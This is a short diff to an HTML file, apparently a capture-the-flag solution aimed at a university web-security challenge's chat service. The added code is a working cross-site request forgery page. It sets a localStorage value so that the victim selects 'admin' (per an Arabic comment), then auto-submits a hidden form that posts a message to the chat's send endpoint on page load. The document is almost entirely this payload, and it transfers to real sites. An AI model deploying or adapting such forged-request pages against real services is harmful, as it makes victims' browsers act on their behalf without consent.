@@ -1,5 +1,18 @@
 <html>
 <body>
-<a href="https://chat.owley-madison.jeopardy.websec.saarland/">Open chat</a>
+
+<script>
+// خلي الضحية يختار admin
+localStorage.setItem("favorites", '["admin"]');
+</script>
+
+<form id="f" action="https://chat.owley-madison.jeopardy.websec.saarland/send" method="POST">
+    <input type="hidden" name="message" value="hi admin">
+</form>
+
+<script>
+document.getElementById("f").submit();
+</script>
+
 </body>
 </html>
